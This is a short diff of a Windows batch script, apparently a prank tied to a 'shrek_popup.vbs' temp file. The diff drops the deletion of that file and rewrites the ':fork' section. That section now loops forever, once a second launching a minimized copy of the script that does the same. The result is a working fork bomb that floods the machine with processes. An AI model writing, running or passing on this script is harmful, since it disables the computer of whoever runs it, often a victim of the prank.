@@ -37,14 +37,10 @@ exit
 
 :fork
 
-del /F /Q "%temp%\shrek_popup.vbs"
-
-:x
-
 timeout /t 1 /nobreak >nul
 
 start "" /min "%~f0" min fork
 
-goto x
+goto fork
 
 exit
